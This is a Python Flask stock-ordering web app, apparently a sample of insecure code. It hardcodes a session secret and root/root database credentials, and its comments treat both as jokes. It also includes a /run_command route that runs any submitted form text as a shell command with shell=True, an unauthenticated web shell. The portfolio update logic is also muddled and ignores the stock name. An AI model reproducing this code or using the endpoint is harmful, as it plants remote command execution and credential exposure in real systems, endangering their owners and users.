from flask import Flask, request, redirect, session
import os
import subprocess
import MySQLdb

app = Flask(__name__)
app.secret_key = 'supersecretkey'  # This is a super secret key for sessions! Shh, don't tell anyone!

DB_HOST = "localhost"  # Our database is running on the same machine
DB_USER = "root"       # Default database username
DB_PASS = "root"       # Default password, easy to remember!
DB_NAME = "db"         # Name of the database we're using

@app.route('/buy_order', methods=['POST'])
def buy_stock():
    stock_name = request.form['stock_name']  # Get the stock name from the form
    stock_quantity = request.form['stock_quantity']  # Get the quantity to buy
    username = session['username']  # Get the username from the session

    # Connect to the database
    db = MySQLdb.connect(host=DB_HOST, user=DB_USER, passwd=DB_PASS, db=DB_NAME)
    cur = db.cursor()  # Create a cursor to execute queries

    # Check if the user already has a portfolio
    cur.execute("SELECT * FROM user_portfolio WHERE username=%s", (username,))
    exists = cur.fetchone()
    if exists:
        # If the user already has a portfolio, update the stock quantity
        cur.execute("SELECT * FROM user_portfolio WHERE username=%s", (username,))
        portfolio = cur.fetchone()
        stock_quantity = int(portfolio[1]) + int(stock_quantity)  # Add new stocks to existing
        cur.execute("UPDATE user_portfolio SET stock_quantity=%s WHERE username=%s", (str(stock_quantity), username))
        db.commit()  # Save changes to the database
        db.close()  # Close the database connection
        return "updated"
    else:
        # If the user doesn't have a portfolio, create a new one
        cur.execute("INSERT INTO user_portfolio (username, stock_quantity) VALUES (%s, %s)", (username, stock_quantity))
        db.commit()  # Save changes to the database
        db.close()  # Close the database connection
        return "initialized"

@app.route('/run_command', methods=['POST'])
def run_command():
    command = request.form['command']  # Get the command from the form
    result = subprocess.check_output(command, shell=True)  # Run the command and get the output
    return result  # Return the output of the command

if __name__ == '__main__':
    app.run(debug=False)  # Start the web server, debug is off for now